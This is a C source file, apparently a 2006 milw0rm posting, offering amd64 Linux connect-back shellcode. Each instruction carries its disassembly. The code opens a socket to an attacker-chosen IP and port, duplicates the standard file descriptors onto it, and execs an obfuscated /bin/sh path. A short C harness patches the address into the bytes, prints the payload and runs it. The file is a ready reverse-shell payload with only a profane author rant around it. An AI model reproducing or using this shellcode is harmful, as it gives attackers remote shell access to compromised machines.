#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>


/*

	usual rant here.. this is just a doodle.. i was curious about
	the amd64 and since i dont think a simple exec /bin/sh is worth releasing

	i give you, my amd64 connect-back semi-stealth shellcode.. i say semi-stelth
	because it contains the bullshit feature that /bin/bash isnt /easily/ noticable

	this code uses both 32 and 64 bit instructions, and uses only 64 bit kernel entrypoints

	if you might say "but..phar.. linux has 32 bit compatability.. and i can just use existing shellcode"

	to that my answer is "fuck you".. i mean.. "there is actually an option to disable 32bit compatability..
	i checked.. its there... i promise"

	im not entirely sure the C crap below will do what you want.. but the shellcode is good and can be edited
	by hand if needed.. (dont forget to invert)

	bpp.etherdyne.net
	www.stonedcoder.org
	phar[at]stonedcoder[dot]org

*/

char sc_raw[] =
"\x48\x31\xd2"                     // xor    %rdx,%rdx
"\x6a\x01"                         // pushq  $0x1
"\x5e"                             // pop    %rsi
"\x6a\x02"                         // pushq  $0x2
"\x5f"                             // pop    %rdi
"\x6a\x29"                         // pushq  $0x29
"\x58"                             // pop    %rax
"\x0f\x05"                         // syscall								#socket

"\x48\x97"                         // xchg   %rax,%rdi						#in_sockaddr, rax does equal 2 but i think i can get away with this
"\x50"                             // push   %rax
"\x48\xb9\x00\x00\x00\x00\x11"     // mov    $0x4141414141414141,%rcx
"\x11\xff\xfd"
"\x48\xf7\xd1"                     // not    %rcx
"\x51"                             // push   %rcx
"\x48\x89\xe6"                     // mov    %rsp,%rsi
"\x6a\x10"                         // pushq  $0x10
"\x5a"                             // pop    %rdx
"\x6a\x2a"                         // pushq  $0x2a
"\x58"                             // pop    %rax
"\x0f\x05"                         // syscall								#connect

"\x6a\x03"                         // pushq  $0x3
"\x5e"                             // pop    %rsi
//dup_loop:
"\x6a\x21"                         // pushq  $0x21
"\x58"                             // pop    %rax
"\x48\xff\xce"                     // dec    %rsi
"\x0f\x05"                         // syscall								#dup2


"\x75\xf6"                         // jne    4004c5 <dup_loop>
"\x48\xbb\xd0\x9d\x96\x91\xd0"     // mov    $0xff978cd091969dd0,%rbx
"\x8c\x97\xff"
"\x48\xf7\xd3"                     // not    %rbx
"\x53"                             // push   %rbx
"\x48\x89\xe7"                     // mov    %rsp,%rdi
"\x48\x31\xc0"                     // xor    %rax,%rax
"\x50"                             // push   %rax
"\x57"                             // push   %rdi
"\x48\x89\xe6"                     // mov    %rsp,%rsi
"\x48\x31\xd2"                     // xor    %rdx,%rdx
"\xb0\x3b"                         // mov    $0x3b,%al
"\x0f\x05"                         // syscall								#exec
;

#define HOSTOFFSET 19
#define PORTOFFSET 23

void scprint(char * foo, int len);
void usage();

void (*shellcode)() = sc_raw;

main(int argc, char *argv[]){
uint32 host;
uint16 port;


	if(argc != 3){	//i'll only do so much to save you from stupidity
		usage();
		exit(1);
	}

	host =~ (int)inet_addr(argv[1]);

	port =~ htons(atoi(argv[2]));

	memcpy(&sc_raw[HOSTOFFSET],&host,4);
	memcpy(&sc_raw[PORTOFFSET],&port,2);
	scprint(sc_raw,sizeof(sc_raw));
	shellcode();
}


void scprint(char * foo, int len){
int i;

	printf("char shellcode[]=\"");
	for(i = 0; i < len; i++){
		printf("\\x%02x",(char)foo[i]&0xff);
	}
	printf("\";\n");
	fflush(stdout);
}

void usage(){
	printf("./%s [<ip address.. and i mean ip address>] [<port number>]\n\n");
}

// milw0rm.com [2006-04-21]